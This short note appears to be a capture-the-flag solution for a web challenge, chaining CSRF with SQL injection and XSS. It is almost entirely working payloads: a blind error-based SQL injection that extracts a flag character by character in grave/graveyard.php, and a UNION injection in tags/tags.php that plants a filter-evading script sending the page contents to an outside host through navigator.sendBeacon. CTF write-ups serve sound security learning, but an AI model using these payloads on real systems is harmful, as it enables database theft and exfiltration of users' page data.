1. first half: csrf -> boolean based error sqli in grave/graveyard.php e.g. `0 UNION SELECT 1,IF(ORD(SUBSTRING(flag, 2, 1))=0x75, exp(100000), 1),1,1,1 FROM flag1;#`
  - xss on another page to read result
2. second half: csrf -> sqli+XSS in tags/tags.php url param
  -  `UNION SELECT CONCAT(flag,"""><script>navigator.sendBeacon(""//hc.lc/log2.php"",document.body.innerHTML)</s\x63ript>") FROM flag2;#`
